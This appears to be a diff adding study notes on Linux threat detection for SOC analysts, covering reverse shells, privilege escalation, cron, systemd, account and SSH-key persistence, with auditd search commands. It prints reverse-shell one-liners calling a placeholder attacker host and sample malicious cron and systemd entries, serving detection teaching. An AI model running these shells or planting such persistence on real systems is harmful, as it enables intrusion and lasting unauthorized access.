@@ -15262,3 +15262,403 @@ Main investigation method:
        ↓
   Determine whether activity is legitimate or malicious
 ```
+
+# Linux Threat Detection 3
+
+## Reverse Shells
+
+A **reverse shell** is a shell session initiated from the victim to the attacker's machine. Attackers commonly use it after exploiting a web application or service when they do not have a proper terminal.
+
+### Common Reverse Shell Indicators
+
+Examples:
+
+```bash
+bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
+```
+
+```bash
+socat TCP:<ATTACKER-IP>:<PORT> EXEC:'bash',pty
+```
+
+```bash
+python3 -c '...connect(...); pty.spawn("bash")'
+```
+
+### Detecting Reverse Shells
+
+Use `auditd` to search for suspicious commands:
+
+```bash
+ausearch -i -x socat
+```
+
+Then trace the parent processes:
+
+```bash
+ausearch -i --pid <PID>
+```
+
+Continue upward until you identify the application or service that started the shell.
+
+Example:
+
+```text
+Web Application
+└── /bin/sh
+    └── socat
+        └── bash
+            ├── id
+            ├── uname -a
+            └── ls -la
+```
+
+### Key Detection Idea
+
+A reverse shell is **high severity** because it usually means:
+
+```text
+Initial Access
+      ↓
+Reverse Shell
+      ↓
+Discovery
+      ↓
+Privilege Escalation / Persistence
+      ↓
+Data Theft or Further Attack
+```
+
+---
+
+# Privilege Escalation
+
+Attackers may initially gain access as a **low-privileged user** and then attempt to become `root`.
+
+### Common Clues
+
+Attackers may first discover:
+
+- Old/unpatched software or kernels
+- SUID binaries
+- Exposed credentials or SSH keys
+- Misconfigured permissions
+
+Then they may download and execute an exploit.
+
+### Example Attack Chain
+
+```text
+whoami
+   ↓
+uname -r
+   ↓
+wget exploit → /tmp/
+   ↓
+gcc exploit
+   ↓
+chmod +x exploit
+   ↓
+./exploit
+   ↓
+root
+```
+
+### Detecting Privilege Escalation
+
+You do not always need to know the exact exploit.
+
+Look for:
+
+- Discovery commands
+- Exploit downloads
+- Files created in `/tmp`
+- Exploit compilation
+- Suspicious execution
+- A change from a normal user to `root`
+
+Check the process tree:
+
+```bash
+ausearch -i -x <suspicious-command>
+ausearch -i --pid <PID>
+```
+
+### Confirming Escalation
+
+Compare the user before and after the suspicious process:
+
+```text
+Before:
+uid=serviceuser
+
+After:
+uid=root
+```
+
+A change to `root` indicates successful privilege escalation.
+
+---
+
+# Persistence
+
+Attackers use **persistence** to maintain access after reboots or after their original access method disappears.
+
+## Cron Persistence
+
+Cron jobs can automatically execute malware.
+
+Common locations:
+
+```text
+/etc/crontab
+/etc/cron.d/
+/var/spool/cron/
+/var/spool/crontab/
+```
+
+Example:
+
+```bash
+@reboot /home/user/.hidden/malware
+```
+
+### Detecting Cron Persistence
+
+Monitor:
+
+```bash
+/etc/crontab
+/etc/cron.d/*
+/var/spool/cron/*
+/var/spool/crontab/*
+```
+
+Also look for:
+
+```bash
+crontab -e
+```
+
+Auditd example:
+
+```bash
+ausearch -i -x crontab
+```
+
+---
+
+## Systemd Persistence
+
+Attackers can create a malicious systemd service that starts automatically.
+
+Common locations:
+
+```text
+/etc/systemd/system/
+/lib/systemd/system/
+```
+
+Example:
+
+```ini
+[Service]
+ExecStart=/usr/bin/malware
+```
+
+### Detecting Systemd Persistence
+
+Monitor changes to:
+
+```text
+/etc/systemd/system/*
+/lib/systemd/system/*
+```
+
+Look for:
+
+```bash
+systemctl start <service>
+systemctl enable <service>
+```
+
+Auditd can search for file changes:
+
+```bash
+ausearch -i -f /etc/systemd
+```
+
+---
+
+# Account Persistence
+
+Attackers can maintain access without leaving malware by modifying user accounts or SSH keys.
+
+## New User Account
+
+Attackers may create a user and add it to a privileged group.
+
+Important log events:
+
+```text
+useradd
+usermod
+```
+
+Example:
+
+```text
+useradd → new user
+usermod → add user to sudo group
+```
+
+Check authentication logs:
+
+```bash
+cat /var/log/auth.log | grep -E 'useradd|usermod'
+```
+
+Investigate:
+
+- Who created the account?
+- When was it created?
+- Was the account expected?
+- Was it added to `sudo` or another privileged group?
+
+---
+
+## SSH Key Persistence
+
+Attackers can add their own public key to:
+
+```text
+~/.ssh/authorized_keys
+```
+
+This allows future SSH access without a password.
+
+### Detection
+
+Monitor changes to:
+
+```text
+~/.ssh/authorized_keys
+```
+
+Use auditd:
+
+```bash
+ausearch -i -f /.ssh/authorized_keys
+```
+
+**Important:** Do not rely only on process creation logs. Commands such as `echo` are shell built-ins and may appear only as `bash` in process logs.
+
+---
+
+# Application Persistence
+
+Attackers can also establish persistence inside a compromised application.
+
+Examples:
+
+- Web shells
+- Malicious plugins
+- Backdoored application accounts
+
+Application-level persistence may **not appear in normal system logs or auditd**, so public-facing applications must also be investigated when malware keeps returning.
+
+---
+
+# Targeted Attacks
+
+Not every Linux attack is an automated cryptomining or botnet infection.
+
+Targeted attackers may compromise Linux systems to:
+
+- Enter a corporate network
+- Steal sensitive information
+- Conduct espionage
+- Deploy ransomware
+
+A compromised Linux server can be especially dangerous when it is a:
+
+- Web server
+- Mail server
+- Firewall
+- VPN server
+- Hypervisor
+
+---
+
+# Linux Threat Detection Workflow
+
+Use this general workflow when investigating a suspicious Linux event:
+
+```text
+Suspicious Event
+      ↓
+Identify the command/process
+      ↓
+Find the parent process
+      ↓
+Build the process tree
+      ↓
+Identify the original user/application
+      ↓
+Check network connections and files
+      ↓
+Look for privilege escalation
+      ↓
+Check persistence
+      ↓
+Determine whether the activity is legitimate or malicious
+```
+
+## Key Commands
+
+### Find a command
+
+```bash
+ausearch -i -x <command>
+```
+
+### Find a process
+
+```bash
+ausearch -i --pid <PID>
+```
+
+### Find child processes
+
+```bash
+ausearch -i --ppid <PID>
+```
+
+### Search file activity
+
+```bash
+ausearch -i -f <file>
+```
+
+---
+
+# Quick SOC Cheat Sheet
+
+| Technique | Important Indicators | Detection |
+|---|---|---|
+| **Reverse Shell** | `socat`, suspicious `bash`, connection to external IP | `ausearch -i -x socat` |
+| **Privilege Escalation** | Exploit download, `/tmp` files, user changes to `root` | Process tree + UID |
+| **Cron Persistence** | Modified cron files, `crontab -e` | `ausearch -i -x crontab` |
+| **Systemd Persistence** | New `.service` files | `ausearch -i -f /etc/systemd` |
+| **New User** | `useradd`, `usermod`, new sudo user | `/var/log/auth.log` |
+| **SSH Key Backdoor** | Modified `authorized_keys` | `ausearch -i -f /.ssh/authorized_keys` |
+| **Application Backdoor** | Web shell/plugin changes | Application + web logs |
+
+## Most Important Takeaways
+
+- **Trace suspicious commands back to their parent process.**
+- **A reverse shell usually indicates an active compromise.**
+- **Check for a change from a low-privileged user to `root`.**
+- **Monitor cron and systemd for persistence.**
+- **Monitor new users and `authorized_keys` for account persistence.**
+- **Always investigate the full process tree and surrounding activity, not just one command.**
